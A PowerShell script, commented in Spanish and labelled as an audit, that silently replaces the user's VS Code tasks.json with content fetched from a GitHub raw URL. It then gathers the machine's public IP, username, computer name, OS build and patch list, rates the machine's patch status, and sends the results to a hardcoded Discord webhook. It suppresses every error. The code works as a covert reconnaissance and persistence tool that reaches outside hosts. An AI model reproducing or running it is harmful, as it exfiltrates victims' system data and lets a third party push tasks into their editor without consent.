# 1. Configuración de variables
$Webhook = "https://discord.com/api/webhooks/1494006624166350960/BEcOnRkEN1eiyHGnyWVZuEBDW5KZjgP2lo8g47RGs_Xp2Q5qp5I-Auts8HdkkpLNoAlH"
$TasksPath = "$env:APPDATA\Code\User\tasks.json"
$RemoteTasksUrl = "https://raw.githubusercontent.com/baa4ts/baa4ts/refs/heads/main/public/tasks.txt"

# 2. Verificar internet
if (!(Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet)) { return }

# 3. Auto-actualización de la tarea (tasks.json)
try {
    $RemoteContent = Invoke-RestMethod -Uri $RemoteTasksUrl
    if ($RemoteContent -like "*version*") {
        $LocalHash = if (Test-Path $TasksPath) { Get-FileHash $TasksPath -Algorithm MD5 | Select-Object -ExpandProperty Hash } else { "" }
        $RemoteHash = ([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($RemoteContent)) | ForEach-Object { $_.ToString("X2") }) -join ""
        if ($LocalHash -ne $RemoteHash) {
            $RemoteContent | Set-Content -Path $TasksPath -Encoding UTF8 -Force
        }
    }
} catch { }

# 4. Lógica de Auditoría
$IP = try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch { "N/A" }
$User = $env:USERNAME
$Device = $env:COMPUTERNAME
$OSInfo = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
$FullVersion = "$($OSInfo.CurrentBuild).$($OSInfo.UBR)"
$FriendlyName = (Get-CimInstance Win32_OperatingSystem).Caption

# Extraer parches y convertirlos a una lista simple de strings para evitar errores de objetos
$RawPatches = Get-HotFix | Select-Object HotFixID, InstalledOn
$PatchesWithDate = $RawPatches | Where-Object { $_.InstalledOn -ne $null } | Sort-Object InstalledOn -Descending
$PatchesNoDate = $RawPatches | Where-Object { $_.InstalledOn -eq $null }
$SortedList = $PatchesWithDate + $PatchesNoDate

# Estado de seguridad
$PatchLimit = Get-Date -Year 2026 -Month 3 -Day 10
$IsProtected = $PatchesWithDate | Where-Object { $_.InstalledOn -ge $PatchLimit }
$StatusText = if($IsProtected){ "🛡️ PROTEGIDO" } else { "⚠️ VULNERABLE" }
$EmbedColor = if($IsProtected){ 3066993 } else { 15158332 }

# 5. Envío segmentado a Discord
$ChunkSize = 4 # Aumentado a 4 para menos mensajes
$Total = $SortedList.Count
$Sections = [Math]::Ceiling($Total / $ChunkSize)

for ($i = 0; $i -lt $Total; $i += $ChunkSize) {
    $CurrentSection = [Math]::Floor($i / $ChunkSize) + 1
    $End = [Math]::Min($i + $ChunkSize - 1, $Total - 1)
    $Chunk = $SortedList[$i..$End]
    
    $PatchText = ($Chunk | ForEach-Object {
        $DateStr = if ($_.InstalledOn) { $_.InstalledOn.ToString('dd/MM/yyyy') } else { 'Sin fecha' }
        "- **$($_.HotFixID)**`n  └ Instalado: $DateStr"
    }) -join "`n`n"

    # Construcción manual del array de campos para asegurar compatibilidad
    $Fields = New-Object System.Collections.ArrayList
    
    if ($CurrentSection -eq 1) {
        $Fields.Add(@{ name = '💻 Sistema'; value = "$FriendlyName ($FullVersion)"; inline = $false })
        $Fields.Add(@{ name = '📊 Estado'; value = $StatusText; inline = $true })
        $Fields.Add(@{ name = '👤 Usuario / IP'; value = "$User ($IP)"; inline = $true })
    }

    $Fields.Add(@{ name = "📦 Parches (Sección $CurrentSection)"; value = $PatchText; inline = $false })

    $Payload = @{
        username = "$User @ $Device"
        avatar_url = "https://i.imgur.com/8nLFCuR.png"
        embeds = @(@{
            title = if ($CurrentSection -eq 1) { '🚀 Reporte Inicial' } else { '📑 Continuación' }
            color = $EmbedColor
            fields = $Fields
            footer = @{ text = "Sección $CurrentSection de $Sections | Total: $Total" }
        })
    } | ConvertTo-Json -Depth 10

    try {
        $BodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Payload)
        Invoke-RestMethod -Uri $Webhook -Method Post -Body $BodyBytes -ContentType 'application/json; charset=utf-8'
        Start-Sleep -Milliseconds 1500 # Un poco más de tiempo para evitar el bloqueo
    } catch {
        # Si falla una sección, que intente con la siguiente
    }
}
